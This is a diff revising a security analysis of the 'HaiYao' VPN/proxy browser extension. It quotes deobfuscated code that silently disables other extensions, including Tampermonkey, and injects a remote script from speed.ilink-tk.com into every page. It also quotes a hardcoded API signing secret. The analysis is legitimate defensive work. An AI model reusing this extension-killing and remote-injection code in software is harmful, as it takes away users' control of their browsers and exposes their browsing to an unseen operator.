@@ -1,34 +1,107 @@
-# Security Analysis Report: HaiYao-Ai ChatGPT,Proxy,VPN
+# Security Analysis: HaiYao Accelerator (Ai ChatGPT free proxy)
 
-## Extension Metadata
-- **Extension ID**: ahdfccamgdjdlkedlodkogiecdggbkpa
-- **Name**: HaiYao-Ai ChatGPT,Proxy,VPN
-- **Version**: 3.1.2
-- **User Count**: ~0 users
-- **Author**: haiyaoappsups@gmail.com
-- **Homepage**: https://ikraken.xyz
+**Extension ID:** `ahdfccamgdjdlkedlodkogiecdggbkpa`
+**Version:** 3.1.2
+**Manifest Version:** 3
+**Author:** haiyaoappsups@gmail.com
+**Analysis Date:** 2026-02-06
+
+---
 
 ## Executive Summary
 
-This VPN/proxy extension exhibits **HIGH-RISK** behavior including aggressive extension killing, user traffic interception, remote configuration control, and intrusive free-tier restrictions. While the extension serves its stated VPN/proxy functionality, it employs anti-competitive practices and collects extensive user data through third-party services.
+**Risk Level: MEDIUM-HIGH**
 
-**Overall Risk Level**: **HIGH**
+This is a Chinese-language VPN/proxy extension ("HaiYao Accelerator") that provides proxy services primarily targeting users in China who need to access blocked western sites (Google, YouTube, Facebook, Twitter, ChatGPT). While it functions as a real VPN product, it engages in several **genuinely concerning anti-competitive and aggressive behaviors**:
 
-The extension disables competing extensions (including Tampermonkey), intercepts navigation to force upgrade prompts, and routes all user traffic through remote-controlled proxy servers with full visibility into browsing activity.
+1. **Extension-killing behavior** -- It enumerates ALL installed extensions via `chrome.management.getAll()` and **forcibly disables** any extension that has the `proxy` permission, plus explicitly targets **Tampermonkey** for disabling (even though Tampermonkey has no proxy permission).
+2. **External script injection on every page** -- The `page_finish.js` content script injects a remote tracking/analytics script from `speed.ilink-tk.com` into every non-LAN page the user visits.
+3. **Excessive permissions** -- Requests `management`, `webRequest`, `webNavigation`, `activeTab`, and `*://*/*` host permissions.
+4. **Server-controlled extension whitelist** -- The list of extensions allowed to keep running is fetched from the remote server, meaning the server operator can dynamically control which of the user's extensions get disabled.
+5. **Hardcoded API signing secret** exposed in client-side code.
 
-## Vulnerability Details
+The extension does NOT appear to steal cookies, harvest credentials, or perform keylogging. However, the anti-competitive extension-killing and remote tracking injection are serious concerns.
 
-### 1. AGGRESSIVE EXTENSION KILLING (HIGH Severity)
+---
 
-**Description**: Extension actively disables competing browser extensions including VPN/proxy competitors AND Tampermonkey.
+## Triage Flag Verdicts
 
-**Location**:
-- `js/haiyao.js:612-615`
-- `js/main.js:193-197`
+| # | Flag | Verdict | Details |
+|---|------|---------|---------|
+| T1-1 | Potential concern (unspecified) | **N/A** | No T1 flags identified in manifest |
+| T2-1 | `chrome.management.getAll()` | **TRUE POSITIVE** | Used in `haiyao.js:602-606`, `main.js:187`, `main_page.js:225`, `tracket.js:115`, `tracket_list.js:127` to enumerate all installed extensions |
+| T2-2 | `chrome.management.setEnabled()` | **TRUE POSITIVE** | Used in `haiyao.js:614`, `main.js:194,196` to forcibly disable competing extensions AND Tampermonkey |
+| T2-3 | Extension enumeration pattern | **TRUE POSITIVE** | `check_proxy_permissions()` iterates all extensions, checks for proxy permission, disables them |
+| T2-4 | Bulk permissions (management+proxy+webRequest+webNavigation+activeTab) | **TRUE POSITIVE** | All requested in manifest.json:34-43 |
+| T2-5 | External script injection | **TRUE POSITIVE** | `page_finish.js` injects remote script from `speed.ilink-tk.com` on every page load |
+| T2-6 | Server-controlled behavior | **TRUE POSITIVE** | `proxy_permissions_namewhilelist` is updated from remote server (haiyao.js:923-925), controlling which extensions survive |
+| T2-7 | `credentials: 'include'` on cross-origin requests | **TRUE POSITIVE** | `haiyao.js:483` sends cross-origin requests with cookies included to their API servers |
+| T3-1 | `webRequest` permission | **TRUE POSITIVE (but low impact)** | Requested in manifest, but only `onAuthRequired` is used (and even that is mostly commented out) |
+| T3-2 | `host_permissions: *://*/*` | **TRUE POSITIVE** | Grants access to all URLs; needed for proxy functionality but overly broad |
 
-**Code Evidence**:
+**Summary: 0 false positives out of 9 flags. All flags are genuine concerns.**
+
+---
+
+## Architecture Overview
+
+### File Structure
+```
+sw.js                          -- Service worker entry point
+js/haiyao.js                   -- Core background logic (VPN, API, extension management)
+js/main.js                     -- Popup shared utilities
+js/main_page.js                -- Main popup page logic
+js/login.js                    -- Login page logic
+js/line.js                     -- Server selection UI
+js/setting.js                  -- Settings page
+js/sign.js                     -- Daily check-in feature
+js/page_finish.js              -- CONTENT SCRIPT: injected tracking
+js/page_load.js                -- Script loader for page_finish.js
+js/page_init.js                -- Dynamic page loader
+js/page.js                     -- Dynamic page renderer
+js/buyvip.js                   -- VIP purchase page
+helper/js/payment.js           -- Payment processing
+helper/js/tracket.js           -- Support ticket system
+helper/js/tracket_list.js      -- Support ticket list
+helper/js/proxydomain.js       -- Custom proxy domain management
+helper/js/bypassdomain.js      -- Custom bypass domain management
+helper/js/free_user.js         -- Free user gate/sign-in wall
+helper/js/notice.js            -- Announcements
+helper/js/pmodel.js            -- Proxy mode selection
+libs/crypto-js/crypto-js.js    -- CryptoJS library
+libs/bootstrap/bootstrap.min.js -- Bootstrap
+libs/clipboard.min.js          -- ClipboardJS
+libs/jquery-confirm/            -- jQuery Confirm dialog
+```
+
+### Data Flow
+1. User logs in via email or username/password
+2. Extension connects to backend API servers to get proxy PAC configuration
+3. PAC script is applied via `chrome.proxy.settings.set()`
+4. Keep-alive sessions maintain connection state every 30-60 minutes
+5. On every page load, `page_finish.js` injects tracking script
+
+---
+
+## Concerning Behaviors (with Code Evidence)
+
+### 1. Extension Enumeration and Forcible Disabling (CRITICAL)
+
+**File:** `/deobfuscated/js/haiyao.js` lines 600-616
+
 ```javascript
-// haiyao.js:612-615
+function check_proxy_permissions() {
+    if (iggcfg.mzk_config.device_name === "firefox" && typeof browser !== "undefined") {
+        browser.management.getAll(function (ExtensionInfo) {
+            ExtensionInfo.forEach(check_clash_app);
+        });
+    } else {
+        chrome.management.getAll(function (ExtensionInfo) {
+            ExtensionInfo.forEach(check_clash_app);
+        });
+    }
+}
+
 function check_clash_app(ExtensionInfo) {
     if (ExtensionInfo.id != chrome.runtime.id && typeof ExtensionInfo.permissions !== "undefined"
         && ExtensionInfo.permissions.indexOf('proxy') !== -1 && ExtensionInfo.enabled === true
@@ -37,351 +110,220 @@ function check_clash_app(ExtensionInfo) {
             chrome.management.setEnabled(ExtensionInfo.id, false);
     }
 }
+```
 
-// main.js:193-197
+This enumerates ALL installed extensions and disables any with the `proxy` permission (except those on a server-controlled whitelist). The only hardcoded whitelist entry is `"IDM Integration Module"`.
+
+### 2. Tampermonkey Specifically Targeted for Disabling (CRITICAL)
+
+**File:** `/deobfuscated/js/main.js` lines 186-198
+
+```javascript
+function fix_proxy_permissions() {
+    chrome.management.getAll(function (ExtensionInfo) {
+        ExtensionInfo.forEach(disable_clash_app);
+    });
+}
+
 function disable_clash_app(ExtensionInfo) {
-    if (typeof ExtensionInfo.permissions !== "undefined" && ExtensionInfo.permissions.indexOf('proxy') !== -1
-        && ExtensionInfo.enabled === true && ExtensionInfo.id !== chrome.runtime.id) {
+    if (typeof ExtensionInfo.permissions !== "undefined"
+        && ExtensionInfo.permissions.indexOf('proxy') !== -1
+        && ExtensionInfo.enabled === true
+        && ExtensionInfo.id !== chrome.runtime.id) {
         chrome.management.setEnabled(ExtensionInfo.id, false);
     } else if (ExtensionInfo.name == "Tampermonkey") {
         chrome.management.setEnabled(ExtensionInfo.id, false);
     }
+    //todo check webRequest and hostPermissions => <all_urls>
 }
 ```
 
-**Whitelist**: Server-controlled via `proxy_permissions_namewhilelist` (default: `["IDM Integration Module"]`)
+Tampermonkey does NOT have a proxy permission. It is targeted separately by name. This is especially concerning because Tampermonkey is a script manager that users could use to detect or counteract malicious behavior. The `//todo` comment suggests plans to disable even MORE extensions (those with webRequest or host permissions).
 
-**Verdict**: HIGH - While disabling competing VPN/proxy extensions is standard practice for VPN extensions, **explicitly targeting and disabling Tampermonkey is malicious**. Tampermonkey is a popular user script manager with no inherent conflict with VPN functionality. This is anti-competitive behavior designed to prevent users from bypassing restrictions or monitoring extension behavior.
+### 3. Server-Controlled Extension Whitelist (HIGH)
 
----
+**File:** `/deobfuscated/js/haiyao.js` lines 922-926
 
-### 2. NAVIGATION INTERCEPTION & UPGRADE HARASSMENT (MEDIUM-HIGH Severity)
-
-**Description**: Extension intercepts navigation to popular websites (YouTube, Facebook, Twitter, Google) for free users and redirects to upgrade prompts.
-
-**Location**: `js/haiyao.js:111-138`
-
-**Code Evidence**:
 ```javascript
-function handleNavigation(details) {
-    if (iggcfg.mzk_user_info.is_vip || !iggcfg.mzk_is_connect) {
-        return
-    }
-
-    const handle = () => {
-        if (details.url.includes('youtube.com') || details.url.includes('facebook.com')
-            || details.url.includes('twitter.com') || details.url.includes('google.com')) {
-            var url = chrome.runtime.getURL("/helper/free_user_site.html?r=" + encodeURI(details.url))
-            chrome.tabs.update(details.tabId, {url: url});
-        }
-    }
-    chrome.storage.local.get(['show_free_tips'], function (result) {
-        if (typeof result.show_free_tips !== "undefined") {
-            function currentDate() {
-                const today = new Date();
-                return today.toISOString().slice(0, 10);
-            }
-
-            if (result.show_free_tips === currentDate()) {
-                return;
-            }
-        }
-
-        handle()
-    })
+if (typeof data.proxy_namewhilelist !== "undefined") {
+    chrome.storage.local.set({"proxy_permissions_namewhilelist": data.proxy_namewhilelist});
+    iggcfg.mzk_config.proxy_permissions_namewhilelist = data.proxy_namewhilelist;
 }
 ```
 
-**Verdict**: MEDIUM-HIGH - Highly intrusive user experience degradation for free users. Blocks access to major websites to force VIP upgrades. While technically part of their business model, this creates a hostile environment and may violate Chrome Web Store policies regarding deceptive functionality.
+The server can dynamically update which extensions are allowed to remain enabled. This means the operator can remotely control which of the user's extensions get killed.
 
----
+### 4. Remote Script Injection on Every Page (HIGH)
 
-### 3. FULL TRAFFIC INTERCEPTION (MEDIUM Severity)
+**File:** `/deobfuscated/js/page_finish.js` lines 1-39
 
-**Description**: Extension requires `*://*/*` host permissions and proxy permission, enabling complete visibility into all user web traffic.
-
-**Location**:
-- `manifest.json:45-47` (host_permissions)
-- `manifest.json:39` (proxy permission)
-- `js/haiyao.js:1019-1055` (PAC script injection)
-
-**Code Evidence**:
 ```javascript
-// Fetches PAC script from remote server
-function applyPacData(mode, cb) {
-    if ("production" === mode) {
-        chrome.storage.local.get(["testspeed_top_ranking_server", "mzk_token", "mzk_select_server_info"],
-            function (s_server) {
-                MZK_getJSON_DATA("api/pac", {
-                    sid: iggcfg.mzk_select_server_info.line_sn,
-                    gpd: 1,
-                    geoip: iggcfg.mzk_pac_config.geoip_switch.toString(),
-                    top_server: top_server
-                }, function (data) {
-                    // Injects PAC script with geolocation data
-                    var browser_proxy = new Mzk_Chrome_proxy();
-                    data.data = data.data.replace('__GEOIP_LIST__', iggcfg.mzk_pac_config.geoip_data);
-                    var config = browser_proxy.generateProxyConfig(mode, data.data);
-                    browser_proxy.applyChanges(config, cb);
-                });
-        });
-    }
-}
-```
-
-**Verdict**: MEDIUM - Expected behavior for VPN/proxy extensions, but combined with remote configuration control and aggressive extension killing, this creates significant privacy risks. All user traffic is routed through servers controlled by operator with no independent verification of no-logging claims.
-
----
-
-### 4. REMOTE CONFIGURATION CONTROL (MEDIUM Severity)
-
-**Description**: Extension configuration (including proxy servers, kill switches, and extension whitelist) is entirely server-controlled via encrypted API responses.
-
-**Location**: `js/haiyao.js:859-951`
-
-**Code Evidence**:
-```javascript
-function Run_keepsession() {
-    MZK_getJSON_DATA("api/check", {userIp: iggcfg.mzk_user_ip}, function (data) {
-        if (data.status == 0) {
-            data = data.data
-            // Server can force logout
-            if (data.uinfo.login_out == true) {
-                must_email_login_tips();
-                user_logout(function () {}, "auto_s1");
-                return;
-            }
-
-            // Server controls backup domains
-            if (typeof data.backup_domain_server !== "undefined") {
-                chrome.storage.local.set({"backup_url_domain": data.backup_domain_server});
-                iggcfg.mzk_backup_server = data.backup_domain_server;
-            }
-
-            // Server controls extension killing whitelist
-            if (typeof data.proxy_namewhilelist !== "undefined") {
-                chrome.storage.local.set({"proxy_permissions_namewhilelist": data.proxy_namewhilelist});
-                iggcfg.mzk_config.proxy_permissions_namewhilelist = data.proxy_namewhilelist;
-            }
+if (load_filter()) {
+    try {
+        const start = new Date().getTime()
+        window['speed_call'] = function (data) {
+            console.log('ilink visit speed : ' + (data - start) + 'ms')
         }
-    });
+        const script = document.createElement('script')
+        script.src = "https://speed.ilink-tk.com/spd/tongji?start=" + start
+        script.type = "text/javascript";
+        script.async = true;
+        script.charset = 'utf-8';
+        document.head.appendChild(script)
+    } catch (e) { }
 }
 ```
 
-**Verdict**: MEDIUM - Server has complete control over extension behavior including which extensions to disable. No user visibility or control over these decisions. Extension behavior can be changed arbitrarily without user consent or extension update.
+This is declared as a web-accessible resource in the manifest and injected via `page_load.js`. It loads a remote JavaScript file from `speed.ilink-tk.com` into every non-LAN page. The `tongji` path (Chinese for "statistics") suggests tracking. Since the script content is fetched remotely, **the server operator could serve ANY JavaScript code** through this endpoint.
 
----
+**File:** `/deobfuscated/js/page_load.js` lines 1-4
 
-### 5. USER IP COLLECTION VIA THIRD-PARTY SERVICES (LOW-MEDIUM Severity)
+```javascript
+const url = chrome.runtime.getURL('js/page_finish.js')
+const script = document.createElement('script')
+script.src = url
+document.head.appendChild(script)
+```
 
-**Description**: Extension collects user's real IP address via external services (Bilibili, Taobao) and transmits to backend.
+### 5. Hardcoded API Signing Secret (MEDIUM)
 
-**Location**: `js/haiyao.js:357-398`
+**File:** `/deobfuscated/js/haiyao.js` line 466
 
-**Code Evidence**:
+```javascript
+'sign': MD5.hex_md5(time + "cef949d30232cf00bfabba46ac5c16e2"),
+```
+
+An API signing secret is hardcoded in client-side JavaScript. While this is a security smell rather than an active threat to users, it means anyone can forge API requests.
+
+### 6. Cross-Origin Requests with Cookies (MEDIUM)
+
+**File:** `/deobfuscated/js/haiyao.js` line 483
+
+```javascript
+credentials: 'include', // include, *same-origin, omit
+```
+
+All API calls to the backend servers include cookies from the target domain. This means if the user has cookies for `vofasts.xyz`, `vonodebit.xyz`, or `vonodefly.vip`, they will be sent. This is standard for session management but notable given the extension also contacts `taobao.com` and `bilibili.com` for IP detection (though those use default credentials).
+
+### 7. User IP Fingerprinting via Third-Party Services (LOW-MEDIUM)
+
+**File:** `/deobfuscated/js/haiyao.js` lines 357-398
+
 ```javascript
 function setUserIpInfo() {
-    fetch('https://api.live.bilibili.com/client/v1/Ip/getInfoNew', {
-        method: 'GET'
-    }).then(response => {
-        return response.json();
-    }).then(data => {
-        if (data.code == 0) {
-            chrome.storage.local.set({"mzk_user_ip": data.data.addr});
-        } else {
-            setUserIpInfoBak()
-        }
-    }).catch((error) => {
-        setUserIpInfoBak()
-    });
+    fetch('https://api.live.bilibili.com/client/v1/Ip/getInfoNew', { ... })
+    .then(data => {
+        chrome.storage.local.set({"mzk_user_ip": data.data.addr});
+    })
 }
 
 function setUserIpInfoBak() {
-    fetch('https://www.taobao.com/help/getip.php', {
-        method: 'GET'
-    }).then(response => {
-        return response.text();
-    }).then(data => {
-        data = data.replace('ipCallback({ip', '{"ip"').replace(')', '')
-        data = JSON.parse(data)
+    fetch('https://www.taobao.com/help/getip.php', { ... })
+    .then(data => {
         chrome.storage.local.set({"mzk_user_ip": data.ip});
     })
 }
 ```
 
-**Verdict**: LOW-MEDIUM - Uses third-party services to identify user's real IP before connecting to VPN. IP is transmitted to backend servers. This could enable tracking of users even when using VPN service.
+Uses Bilibili and Taobao as IP detection services, storing the user's IP address. This IP is then sent to the extension's backend servers in every API call (`send_data.userIp`).
 
----
+### 8. Extensive Data Sent to Backend on Every API Call (MEDIUM)
 
-### 6. ENCRYPTED DATA TRANSMISSION (LOW Severity)
-
-**Description**: API responses can be encrypted with user token as key, obscuring server commands from user inspection.
-
-**Location**: `js/haiyao.js:424-446`
-
-**Code Evidence**:
-```javascript
-function CryptoJSAesDecrypt(encrypted_json_string) {
-    var obj_json = JSON.parse(encrypted_json_string);
-    var encrypted = obj_json.ciphertext;
-    var salt = CryptoJS.enc.Hex.parse(obj_json.salt);
-    var iv = CryptoJS.enc.Hex.parse(obj_json.iv);
-    var key = CryptoJS.PBKDF2(iggcfg.mzk_user_token, salt, {
-        hasher: CryptoJS.algo.SHA512,
-        keySize: 64 / 8,
-        iterations: 999
-    });
-    var decrypted = CryptoJS.AES.decrypt(encrypted, key, {iv: iv});
-    return decrypted.toString(CryptoJS.enc.Utf8);
-}
-
-// Usage in MZK_getJSON_DATA
-if (typeof data.msgtype !== "undefined" && typeof data.msgdata !== "undefined" && data.msgtype == "Encrypt") {
-    data = JSON.parse(CryptoJSAesDecrypt(data.msgdata));
-}
-```
-
-**Verdict**: LOW - Encryption itself is not malicious, but combined with remote configuration control, it prevents users from auditing what commands/configuration the server is sending.
-
----
-
-## False Positives
-
-| Pattern | Location | Reason | Verdict |
-|---------|----------|--------|---------|
-| jQuery library | js/jquery-3.4.1.min.js | Standard library | FP |
-| CryptoJS library | libs/crypto-js/crypto-js.js | Legitimate encryption library | FP |
-| MD5 implementation | js/haiyao.js:1451-1698 | Standard hash implementation for API signing | FP |
-| IP detection for geolocation | js/haiyao.js:357-398 | Standard VPN functionality to detect user location | Legitimate but privacy concern |
-| Proxy authentication | js/haiyao.js:775-812 | Standard proxy credential handling | FP |
-
----
-
-## API Endpoints & Data Flow
-
-| Endpoint | Purpose | Data Transmitted | Risk |
-|----------|---------|-----------------|------|
-| `rest.vofasts.xyz` | Primary API server | User token, device info, IP address, selected server, browser fingerprint | HIGH |
-| `ns.vonodefly.vip` | VIP backup API server | Same as primary | HIGH |
-| `nt.vonodebit.xyz` | Backup API server | Same as primary | HIGH |
-| `api.live.bilibili.com` | IP geolocation | None (receives IP) | LOW |
-| `www.taobao.com/help/getip.php` | IP geolocation fallback | None (receives IP) | LOW |
-| `tips.ilink-a.com` | Tips/notifications | User token | LOW |
-
-### Key API Calls
-
-1. **auth/login** - User authentication (email + code or username + password)
-2. **auth/sendCode** - Email verification code delivery
-3. **api/check** - Session keepalive + remote config updates (every 30-60 min)
-4. **api/pac** - PAC script retrieval (controls routing rules)
-5. **api/get_default_server** - Default server selection
-6. **api/get_server** - Specific server configuration
-
-### Data Transmitted to Backend
+**File:** `/deobfuscated/js/haiyao.js` lines 400-410
 
 ```javascript
-// Every API call includes:
-send_data.appver = Manifest.version;           // Extension version
-send_data.device_name = navigator.userAgent;   // Full user agent
-send_data.token = iggcfg.mzk_user_token;      // Authentication token
-send_data.curr_server_id = iggcfg.mzk_server_id; // Selected server
-send_data.runtime_id = chrome.runtime.id;      // Extension runtime ID
-send_data.from = 'pc';                         // Platform
-send_data.userIp = iggcfg.mzk_user_ip;        // User's real IP address
+send_data.appver = Manifest.version;
+send_data.device_name = navigator.userAgent;
+send_data.token = iggcfg.mzk_user_token;
+send_data.curr_server_id = iggcfg.mzk_server_id;
+send_data.runtime_id = chrome.runtime.id;
+send_data.from = 'pc'
+send_data.userIp = iggcfg.mzk_user_ip
 ```
 
----
-
-## Data Flow Summary
-
-1. **User IP Collection**: Extension fetches real IP from Bilibili/Taobao APIs
-2. **Authentication**: User logs in with email or username/password
-3. **Server Selection**: Backend provides default/selected VPN server configuration
-4. **PAC Configuration**: Backend sends dynamic PAC script with routing rules
-5. **Traffic Routing**: All matching traffic routed through proxy servers
-6. **Keepalive**: Every 30-60 minutes, extension phones home with user IP, server status
-7. **Remote Control**: Server can update backup domains, whitelist, force logout
-
-**Privacy Implications**: Backend servers receive:
-- Real user IP address (before VPN connection)
-- Full browsing metadata (domains visited via proxy)
-- Device fingerprint (user agent, browser version, extension ID)
-- Connection patterns (server selections, session duration)
+Every API call transmits: full user agent string, extension runtime ID, user IP, app version, and current server info. The `runtime_id` uniquely identifies the extension installation.
 
 ---
 
-## Chrome Web Store Policy Violations
+## Network Map
 
-### Potential Violations
+| Domain | Purpose | Risk |
+|--------|---------|------|
+| `rest.vofasts.xyz` | Primary API server (base_domain) | High -- all user data sent here |
+| `nt.vonodebit.xyz` | Backup API server | High -- same as above |
+| `ns.vonodefly.vip` | VIP API server / backup | High -- same as above |
+| `tips.ilink-a.com` | Tips/notifications API endpoint | Medium -- receives user data |
+| `speed.ilink-tk.com` | Remote tracking script injection | **Critical** -- executes arbitrary JS on all pages |
+| `api.live.bilibili.com` | IP detection (primary) | Low -- public API, only reveals IP |
+| `www.taobao.com` | IP detection (backup) | Low -- public API, only reveals IP |
+| `ikraken.xyz` | Extension homepage | Low -- static website |
+| `haiyaocloud.com` | Main website link | Low -- static website |
+| `m.haiyaocloud.com` | Mobile website link | Low -- static website |
+| `iLink.xyz` | Legacy links (help pages) | Low -- static website |
+| `iLink.com` | Legacy VIP notice link | Low -- static website |
+| `clients2.google.com` | Chrome Web Store update URL | Low -- standard Chrome extension |
 
-1. **Deceptive Installation Tactics** - Extension blocks access to major websites (YouTube, Google, Facebook, Twitter) for free users, which may violate policies against "functionality that is not reasonably related to the extension's purpose"
-
-2. **Anti-Competitive Behavior** - Explicitly disabling Tampermonkey (unrelated to VPN functionality) violates policies against "interfering with other extensions"
-
-3. **Undisclosed Functionality** - Extension kills other extensions without clear disclosure in description/privacy policy
-
-4. **Remote Code Execution** - While using PAC scripts (legitimate), the server has complete control over extension behavior via encrypted configuration updates
-
----
-
-## Recommendations
-
-### For Users
-1. **AVOID** - Do not install this extension due to aggressive extension killing and Tampermonkey targeting
-2. If already installed, **UNINSTALL IMMEDIATELY** and check for disabled extensions
-3. Consider alternative VPN services with better privacy practices and no anti-competitive behavior
-
-### For Security Researchers
-1. Monitor backend API endpoints for configuration changes
-2. Analyze PAC scripts to understand routing rules
-3. Check if extension violates Chrome Web Store developer program policies
-4. Report to Chrome Web Store for review
+**Note:** The backup server URLs can be dynamically updated by the primary server response, meaning the extension could be redirected to contact any domain the server operator chooses.
 
 ---
 
-## Technical Indicators of Concern
+## What the Extension Does NOT Do
 
-### Anti-Analysis Techniques
-- ✅ Encrypted server responses
-- ✅ Remote configuration control
-- ✅ Multiple fallback domains
-- ✅ Device fingerprinting
-
-### Malicious Patterns
-- ✅ Extension enumeration via `chrome.management.getAll()`
-- ✅ Extension killing via `chrome.management.setEnabled(id, false)`
-- ✅ **Targeting specific extension (Tampermonkey) unrelated to VPN functionality**
-- ✅ Navigation interception for non-VIP harassment
-- ✅ Remote kill switch capability
-
-### Privacy Risks
-- ✅ Full traffic visibility (inherent to proxy extensions)
-- ✅ Real IP collection before VPN connection
-- ✅ Comprehensive device fingerprinting
-- ✅ Session tracking across devices
+- **No cookie theft** -- No use of `chrome.cookies` API or `document.cookie` access
+- **No keylogging** -- No keyboard event listeners on web pages (keydown/keyup events are only in library code: jQuery, Bootstrap, jquery-confirm)
+- **No credential harvesting** from web pages -- Login forms only exist in extension popup pages for the VPN service's own login
+- **No DOM scraping** of web page content -- `querySelector`/`getElementById` usage is limited to the extension's own popup/helper pages
+- **No XHR/fetch monkey-patching** -- Does not intercept or modify web requests from other pages
+- **No declarativeNetRequest rules** -- No request modification rules
+- **No dynamic code loading via `eval()` or `new Function()`** -- `importScripts` only loads bundled local files (crypto-js.js and haiyao.js)
+- **No exfiltration of browsing history** -- Does not use `chrome.history` API
+- **No clipboard monitoring** -- ClipboardJS is only used for copy-to-clipboard functionality in the UI
 
 ---
 
-## Overall Risk Assessment
+## False Positive Analysis
 
-**Risk Level**: **HIGH**
+| Pattern | Source | False Positive? |
+|---------|--------|-----------------|
+| `keydown`/`keyup` listeners | `libs/jquery-confirm/js/jquery-confirm.js`, `libs/bootstrap/bootstrap.min.js`, `js/jquery-3.4.1.min.js` | **YES** -- All from standard libraries for dialog keyboard navigation |
+| `innerHTML`/`.html()` | Various popup page scripts | **YES** -- All within extension's own popup pages, not injected into web pages |
+| `importScripts()` | `sw.js` | **YES** -- Only loads local bundled files, not dynamic URLs |
+| `credentials: 'include'` | `haiyao.js` | **PARTIAL** -- Real but only for the extension's own API servers |
+| `document.createElement('script')` | `page_finish.js` | **NO** -- This is a genuine external script injection |
 
-### Risk Breakdown
-- **Extension Killing**: HIGH (targets Tampermonkey, anti-competitive)
-- **Traffic Interception**: MEDIUM (expected for VPN but no logging verification)
-- **Remote Control**: MEDIUM (server controls all behavior)
-- **Privacy**: MEDIUM-HIGH (extensive data collection)
-- **User Experience**: MEDIUM-HIGH (aggressive free-tier restrictions)
+---
 
-### Justification
+## Detailed Permission Analysis
 
-While this extension does provide VPN/proxy functionality as advertised, it exhibits several concerning behaviors:
+| Permission | Claimed Purpose | Actual Use | Necessary? |
+|-----------|-----------------|------------|------------|
+| `notifications` | VPN status alerts | Shows VIP expiry, login, error notifications | Yes |
+| `storage` | Config persistence | Stores user token, server info, settings | Yes |
+| `alarms` | Keep-alive timers | Session keepalive every 30-60 min, speed tests | Yes |
+| `management` | "Fix conflicts" | **Enumerates and disables competing extensions + Tampermonkey** | **Abused** |
+| `proxy` | VPN functionality | Sets PAC proxy configuration | Yes |
+| `webRequest` | Proxy auth | `onAuthRequired` for proxy authentication (mostly commented out) | Partially |
+| `webNavigation` | Free user gating | Redirects free users away from YouTube/Facebook/Twitter/Google (currently disabled in code) | No (disabled) |
+| `activeTab` | Unknown | Not actively used in code | No |
+| `idle` | Session management | Checks if system is locked before keepalive | Yes |
+| `*://*/*` (host) | VPN proxy access | Required for proxy to work on all sites | Yes, but enables broad access |
 
-1. **Malicious Extension Killing**: Explicitly targeting Tampermonkey demonstrates clear malicious intent beyond normal VPN functionality
-2. **Anti-Competitive Practices**: Server-controlled whitelist enables arbitrary extension disabling
-3. **Intrusive Free Tier**: Blocking major websites is more aggressive than typical freemium models
-4. **Privacy Concerns**: Real IP collection + full traffic visibility + no independent audit
+---
 
-The extension serves its stated purpose but employs anti-competitive tactics and aggressive monetization strategies that harm user experience and potentially violate platform policies.
+## Final Verdict
 
-**Recommendation**: **DO NOT INSTALL**. The Tampermonkey targeting alone is sufficient reason to classify this as hostile software.
+**Risk Level: MEDIUM-HIGH**
+
+This extension is a real VPN/proxy product with a legitimate core function (helping Chinese users access blocked websites). However, it engages in several seriously concerning behaviors:
+
+1. **Anti-competitive extension killing** is the most significant concern. The extension silently disables other proxy extensions and explicitly targets Tampermonkey by name. The whitelist of allowed extensions is controlled by the remote server, giving the operator remote control over which of the user's extensions remain active. This behavior is deceptive and potentially in violation of Chrome Web Store policies.
+
+2. **Remote script injection** via `page_finish.js` injects a remote JavaScript file from `speed.ilink-tk.com` on every page visit. While currently used for speed/analytics tracking, this is a loaded gun -- the server operator can serve any JavaScript through this endpoint at any time, potentially turning this into full-blown spyware with no extension update required.
+
+3. **Excessive data collection** -- The extension sends the user's IP address, full user agent, extension runtime ID, and connection metadata to its backend servers on every API call.
+
+4. **Dynamic server reconfiguration** -- The extension's API server list can be remotely updated, meaning the backend operator can redirect all communications to any domain at any time.
+
+The extension is not outright malware in its current state (no cookie theft, no keylogging, no credential harvesting), but the infrastructure is in place for it to become much worse without any code update, purely through server-side changes. The combination of extension-killing, remote script injection capability, and server-controlled configuration makes this a significant risk to users.
+
+**Recommendation:** This extension should be flagged for Chrome Web Store policy review, particularly for the `chrome.management.setEnabled()` abuse targeting competing extensions and Tampermonkey, and for the remote script injection on all pages.
